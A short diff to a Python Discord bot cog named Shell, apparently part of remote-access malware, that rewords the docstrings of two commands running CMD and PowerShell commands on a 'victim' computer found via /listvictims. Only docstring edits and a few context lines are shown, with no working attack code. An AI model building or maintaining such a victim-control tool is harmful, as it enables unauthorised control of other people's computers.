@@ -17,7 +17,7 @@ class Shell(commands.Cog):
         Parameters
         ----------
         victim: Identifier of the affected computer (found via /listvictims).
-        command: The CMD command which will be executed
+        command: The cmd command to be executed
         """
         if str(victim) == str(self.bot.identifier):
             await ctx.response.defer()
@@ -56,7 +56,7 @@ class Shell(commands.Cog):
         Parameters
         ----------
         victim: Identifier of the affected computer (found via /listvictims).
-        command: The PS command which will be executed
+        command: The powershell command to be executed
         """
         if str(victim) == str(self.bot.identifier):
             await ctx.response.defer()
